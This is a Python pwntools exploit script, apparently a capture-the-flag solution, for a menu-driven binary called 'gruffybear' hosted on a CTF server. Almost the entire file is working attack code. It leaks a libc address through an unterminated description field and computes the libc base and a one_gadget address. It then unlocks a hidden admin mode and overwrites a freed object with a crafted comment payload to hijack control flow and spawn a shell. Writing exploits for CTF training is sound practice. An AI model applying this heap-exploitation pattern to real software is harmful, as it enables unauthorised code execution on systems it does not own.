from pwn import *

# context.log_level = "debug"

mode = "remote"

if mode == "local":
    # Local Offsets
    offset_free = 0x00000000000844f0
    offset_one_gadget = 0xf02a4
else:
    offset_free = 0x00000000000844f0
    offset_one_gadget = 0xf02a4


class GruffyBear:
    def __init__(self, p):
        self.p = p
        self.bear_num = 0

    def clear_menu(self):
        self.p.recvuntil("0. Exit")

    def build_bear(self, name, bid, age, description):
        self.clear_menu()
        self.p.sendline("1")
        self.p.recvuntil("Bear Name: ")
        self.p.send(name.ljust(31, "\x00"))
        self.p.recvuntil("Bear ID: ")
        self.p.sendline(hex(bid))
        self.p.recvuntil("Bear Age: ")
        self.p.sendline(str(bid))
        self.p.recvuntil("Bear Description: ")
        self.p.send(description.ljust(128, "\x00"))
        self.p.recvuntil("Bear created!")
        log.info("Bear (%s, %x, %d, %s) Created" %
                 (name, bid, age, description))
        self.bear_num += 1

    def select_bear(self, selection):
        self.clear_menu()
        self.p.sendline("2")
        self.p.recvuntil("Selection: ")
        self.p.sendline(str(selection))
        log.info("Bear %d selected" % selection)

    def print_bear(self):
        self.clear_menu()
        self.p.sendline("4")
        self.p.recvuntil("You have selected: [")
        name = self.p.recvline()[:-2]
        self.p.recvuntil("It's ID is ")
        bid = int(self.p.recvline()[:-1], 16)
        self.p.recvuntil("It's AGE is ")
        age = int(self.p.recvline()[:-1])
        self.p.recvuntil("It's DESCRIPTION is ")
        description = self.p.recvuntil("Forest Fires are Bad!")
        description = description[:-22]
        return (name, bid, age, description)

    def enable_admin(self):
        self.clear_menu()
        self.p.sendline("1")
        self.p.recvuntil("Here we are now... ")
        self.p.sendline("ENTERTAINUS")
        log.success("Admin enabled!")

    def leak_free(self):
        self.build_bear("A", 1, 1, "A" * 128)
        self.select_bear(0)
        leak_str = self.print_bear()[3]
        free_leak = u64(leak_str[128:].ljust(8, "\x00"))
        return free_leak

    def delete(self):
        self.clear_menu()
        self.p.sendline("3")
        self.p.recvuntil("Deleted!")
        log.info("Deleted bear")

    def add_comment(self, length, content):
        self.clear_menu()
        self.p.sendline("5")
        self.p.recvuntil("How long should the comment be: ")
        self.p.sendline(str(length))
        self.p.recvuntil("Comment: ")
        assert(len(content) == length)
        self.p.send(content)
        log.info("Content of length %d sent." % length)

    def self_destruct(self):
        self.clear_menu()
        self.p.sendline("7")

    def create_max_bears(self):
        for i in range(13 - self.bear_num):
            self.build_bear("A", 1, 1, "A")


def main():
    if mode == "local":
        p = process("./gruffybear")
    else:
        p = remote("ctf.pwn.sg", 4002)
    gb = GruffyBear(p)
    free_leak = gb.leak_free()
    libc_base = free_leak - offset_free
    log.info("free@libc: 0x%x" % free_leak)
    log.info("libc: 0x%x" % libc_base)
    one_gadget = libc_base + offset_one_gadget
    log.info("one_gadget@libc: 0x%x" % one_gadget)
    gb.create_max_bears()
    gb.enable_admin()
    gb.select_bear(12)
    gb.delete()
    payload = "A" * 176
    payload += p64(one_gadget)
    gb.add_comment(184, payload)
    gb.self_destruct()

    p.interactive()


if __name__ == "__main__":
    main()
